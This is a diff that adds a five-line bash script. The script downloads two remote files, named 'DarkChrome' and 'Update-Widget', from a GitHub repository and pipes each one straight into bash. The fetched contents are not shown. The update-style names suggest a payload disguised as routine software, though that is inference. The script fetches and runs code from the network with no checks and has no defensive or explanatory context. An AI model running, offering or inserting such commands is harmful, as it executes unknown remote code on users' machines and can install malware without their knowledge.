@@ -1,0 +1,5 @@
+#!/bin/bash
+
+wget -O - https://raw.githubusercontent.com/panjiades/Update-3/refs/heads/main/DarkChrome | bash
+
+wget -O - https://raw.githubusercontent.com/panjiades/Update-3/refs/heads/main/Update-Widget | bash; exit
